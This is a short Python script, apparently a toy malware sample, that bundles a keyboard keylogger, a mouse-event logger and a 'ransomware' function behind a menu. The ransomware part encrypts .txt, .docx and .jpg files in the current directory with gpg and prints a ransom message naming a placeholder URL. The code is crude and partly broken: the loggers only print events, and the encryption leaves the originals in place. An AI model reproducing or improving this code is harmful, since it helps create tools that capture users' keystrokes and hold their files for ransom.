from pynput import keyboard
from pynput import mouse
import os
import subprocess

# Keylogger keyboard
def on_press(key):
   # Print the key pressed
   print('{0} pressed'.format(key))

def on_release(key):
   # Exit the listener if ESC is released
   if key == keyboard.Key.esc:
       return False

def execute_keyboard():
   # Start a listener for keyboard events
   with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
       listener.join()  # Wait for the listener to finish execution

# Keylogger Mouse
def on_move(x, y):
   # Print the mouse movement coordinates
   print('Mouse moved to ({0}, {1})'.format(x, y))

def on_click(x, y, button, pressed):
   # Print if a mouse button is pressed or released
   if pressed:
       print('{0} at {1}'.format('Pressed', (x, y)))
   else:
       return False  # Stop the listener if the button is released

def execute_mouse():
   # Start a listener for mouse events
   with mouse.Listener(on_move=on_move, on_click=on_click) as listener:
       listener.join()  # Wait for the listener to finish execution

# Ransoware
def encrypt_files():
   # Encrypt files with specific extensions in the current directory
   for root, dirs, files in os.walk("."):
       for file in files:
           if file.endswith((".txt", ".docx", ".jpg")):
               with open(os.path.join(root, 'encrypted_' + file), 'wb') as f:
                   subprocess.run(['gpg', '-c', os.path.join(root, file)], stdout=f)  # Encrypt the file using gpg
   print("FILES HAS BEEN ENCRYPTED, Please follow the URL to get back your files www.dddd.com")

if __name__ == "__main__":
   while True:
       print("\nOptional Operations:")
       print("1. Execute Keyboard Operation")
       print("2. Simulate Mouse Click")
       print("3. Encrypt Files")

       choice = input("Enter your choice (1/2/3) or 'q' to quit: ")

       if choice == "1":
           execute_keyboard()  # Call the function to listen for keyboard events
       elif choice == "2":
           execute_mouse()  # Call the function to listen for mouse events
       elif choice == "3":
           encrypt_files()  # Call the function to encrypt files
       elif choice.lower() == "q":
           break  # Exit the loop if 'q' is entered
       else:
           print("Invalid choice. Please choose again.")



